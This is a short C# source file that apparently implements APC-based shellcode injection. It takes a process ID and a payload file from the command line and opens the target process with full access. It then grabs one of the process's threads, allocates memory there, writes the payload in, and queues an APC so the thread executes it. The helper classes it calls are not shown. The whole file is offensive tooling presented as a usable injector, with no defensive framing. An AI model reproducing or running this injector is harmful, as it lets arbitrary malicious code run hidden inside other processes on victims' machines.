using System;

namespace newjeans
{
    class Program
    {
        private static IntPtr GetProcessHandle(int processPid)
        {

            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID(); ci.UniqueProcess = new IntPtr(processPid);

            var status = Win32.NtOpenProcess(
                out IntPtr hProcess,
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_ALL_ACCESS,
                oa,
                ci
            );

            if (status != Win32.NTSTATUS.Success)
            {
                throw new Exception($"NtOpenProcess ERROR! Status: {status}");
            }

            return hProcess;
        }

        private static IntPtr GetThreadHandle(IntPtr hProcess)
        {
            var status = Win32.NtGetNextThread(
                hProcess,
                IntPtr.Zero,
                Win32.THREAD_ACCESS_RIGHT.THREAD_ALL_ACCESS,
                0,
                0,
                out IntPtr hThread
            );

            if (status != Win32.NTSTATUS.Success || hThread == IntPtr.Zero)
            {
                throw new Exception($"NtGetNextThread ERROR! Status: {status}");
            }

            return hThread;
        }

        static void Main(string[] args)
        {
            var fo = File.ReadFile(args[1]);

            IntPtr fileContent = fo.Item1; int fileSize = fo.Item2;

            IntPtr hProcess = GetProcessHandle(Convert.ToInt32(args[0]));
            IntPtr hThread = GetThreadHandle(hProcess);

            IntPtr BaseAddress = Memory.Allocate(hProcess, fileSize);

            Memory.Write(hProcess, BaseAddress, fileContent, fileSize);

            Apc.QueueApc(hThread, BaseAddress);
        }
    }
}